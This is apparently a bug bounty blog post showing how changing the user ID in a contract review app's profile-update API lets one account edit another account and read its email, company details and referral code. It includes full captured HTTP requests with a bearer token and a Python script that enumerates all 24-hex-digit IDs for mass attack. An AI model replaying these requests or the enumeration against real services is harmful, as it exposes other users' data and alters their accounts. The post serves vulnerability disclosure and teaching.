---
layout: post
title: Changing userID leads to Data leakage and Profile Update
categories: bug hunting 
---

In another bug bounty session of mine, I came across a bounty program of a "Contract Review" company.

In their web app, one could register with a first/last name, an email and their company's name (and a password ofc).

Upon trying to figure out how the web app works, I updated my profile by changing my first name from "vict0ni" to "vict0ni1337". I captured the request:

```
OPTIONS /users/5e335fafedd93a1f35b6ca27 HTTP/1.1
Host: clientapi.website.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: */*
Accept-Language: en,en-US;q=0.7,de;q=0.3
Accept-Encoding: gzip, deflate
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: authorization,content-type
Origin: https://app.website.com
Connection: close
```
followed by:
```
PUT /users/5e335fafedd93a1f35b6ca27 HTTP/1.1
Host: clientapi.website.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en,en-US;q=0.7,de;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2KyIjoiNWUzMzVmYWZlZGQ5M2UxZjM1YjZjYTI3IiwiaWF0IjoxNTgwNDk1MDQ3LCJleHAiOjE1NTM3MjQ5NTA0N30.LM8jJM46ZvFPwlzJ9hezXf_W0oOSpgvfpOastWU7UZA
Content-Length: 188
Origin: https://app.website.com
Connection: close

{"user":{"firstName":"vict0ni1337","lastName":"0x00sec","email":"vict0ni@bugcrowdninja.com","password":null,"dismissedGuides":{"contractHelpPopup":false},"company":"5e335faeedd93a1f35b6ca26"}}
```
resulting to this response:
```
HTTP/1.1 200 OK
Date: Thu, 06 Feb 2020 13:43:35 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 948
Connection: close
Set-Cookie: __cfduid=db2571d1ac9e83a96ca3265b9a0bf1d4c1580996613; expires=Sat, 07-Mar-20 13:43:33 GMT; path=/; domain=.website.com; HttpOnly; SameSite=Lax
Access-Control-Allow-Origin: https://app.website.com
ETag: W/"3b4-QbbUm9x0qtqg3/Bqcixd7mbQgqw"
Vary: Origin, Accept-Encoding
CF-Cache-Status: DYNAMIC
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 560d8dc0581c4098-HAM

{"users":[{"contracts":[],"createdAt":1580425135972,"updatedAt":1580996613958,"id":"5e335fafedd93a1f35b6ca27","email":"vict0ni@bugcrowdninja.com","firstName":"vict0ni1337","lastName":"0x00sec","role":"admin","resetPasswordTokenExpires":0,"dismissedGuides":{"contractHelpPopup":false},"dripId":"3measgw3gr1yjpgvddqn","deleted":false,"master":false,"lastLogoutDate":0,"company":"5e335faeedd93a1f35b6ca26"}],"companies":[{"createdAt":1580425133542,"updatedAt":1580428552059,"id":"5e335faeedd93a1f35b6ca26","name":"BugBounty","seq":5119,"vatId":"","phone":"1337","country":null,"employeeCount":"","singleReviewsAvailable":3,"monthlyReviewsAvailable":0,"referredByCode":"","referralCode":"zqpwr","referralExtraCredits":0,"subscription":{"id":"16A1DGRp7Up0s1Qu7","planId":"website-basic","planName":"website Basic"},"emailInAddress":"","links":{"users":"/companies/5e335faeedd93a1f35b6ca26/users","contracts":"/companies/5e335faeedd93a1f35b6ca26/contracts"}}]}
```
So I was making an OPTIONS request and then a PUT request with my personal userID ``5e335fafedd93a1f35b6ca27`` updating my first name (one could only change the first and last name).

I always make two accounts when testing a web app. I did the same thing for my second account, just in order to grab that userID. Then I thought what could happen if I used the userID of account B in a request to update the account A. So I did the exact same thing as described above, being authorized as a user of account A, but using the userID of account B:

```
PUT /users/5e3c8692f3d2c616c6ed78e9 HTTP/1.1
Host: clientapi.website.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en,en-US;q=0.7,de;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2KyIjoiNWUzMzVmYWZlZGQ5M2UxZjM1YjZjYTI3IiwiaWF0IjoxNTgwNDk1MDQ3LCJleHAiOjE1NTM3MjQ5NTA0N30.LM8jJM46ZvFPwlzJ9hezXf_W0oOSpgvfpOastWU7UZA
Content-Length: 188
Origin: https://app.website.com
Connection: close

{"user":{"firstName":"vict0ni1337","lastName":"0x00sec","email":"vict0ni@bugcrowdninja.com","password":null,"dismissedGuides":{"contractHelpPopup":false},"company":"5e335faeedd93a1f35b6ca26"}}
```
resulting to this response:

```
HTTP/1.1 200 OK
Date: Thu, 06 Feb 2020 21:38:07 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 943
Connection: close
Set-Cookie: __cfduid=d78cefde78c34008ca49d162306b8fcfb1581025085; expires=Sat, 07-Mar-20 21:38:05 GMT; path=/; domain=.website.com; HttpOnly; SameSite=Lax
Access-Control-Allow-Origin: https://app.website.com
ETag: W/"3af-ctJNYxOVotnOZ8DYR4ejpainHVE"
Vary: Origin, Accept-Encoding
CF-Cache-Status: DYNAMIC
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 561044dd2b4fcd93-CDG

{"users":[{"contracts":[],"createdAt":1581024914019,"updatedAt":1581025085895,"id":"5e3c8692f3d2c616c6ad78e9","email":"yigoxa6599@jmail7.com","firstName":"vict0ni1337","lastName":"0x00sec","role":"admin","resetPasswordTokenExpires":0,"dismissedGuides":{"contractHelpPopup":false},"dripId":"5pjs1pjjwprphpkce0rj","deleted":false,"master":false,"lastLogoutDate":0,"company":"5e3c8690f3d2c616c6ed78e8"}],"companies":[{"createdAt":1581024911551,"updatedAt":1581024919638,"id":"5e3c8690f3d2c616c6ed78e8","name":"CompanyB","seq":5137,"vatId":"","phone":"","country":null,"employeeCount":"","singleReviewsAvailable":3,"monthlyReviewsAvailable":0,"referredByCode":"","referralCode":"plozx","referralExtraCredits":0,"subscription":{"id":"16BcmbRpl5Qvt1Lwv","planId":"website-basic","planName":"website Basic"},"emailInAddress":"","links":{"users":"/companies/5e3c8690f3d2c616c6ed78e8/users","contracts":"/companies/5e3c8690f3d2c616c6ed78e8/contracts"}}]}
```
So, by changing the userID to the account B's userID, I could update the account B's first and last name, grab it's mail, referral code, companyID, subscription plan, number of employees, phone number, the company's [VAT identification number](https://en.wikipedia.org/wiki/VAT_identification_number) etc., while being authorized as account A. With the referral code, a user could use it to gain $30 as a "gift" for getting referred by another user.

While that's all good, the userID of each account remains secret. There had to be some kind of MiTM attack to capture it and make a targeted attack. So I thought maybe I could generalize the attack, instead of targeting a single account.
By using dummy userIDs, in order to test the brute-force protection, I found out that the endpoint was vulnerable to brute-force attacks. Since the userID is following a certain pattern (a string of 24 hex characters), one could generate all the possible IDs and save them into a file with this python script:

```python
import itertools

string = '0123456789abcdef'
file = open('userIDs.txt', 'w')
for p in itertools.product(string, repeat=24):
	writing = ''.join(p) + '\n'
	file.write(writing)
file.close()
```

With enough computing power, an attacker could change the first/last name of all users and grab their account and company info.


Thanks for reading!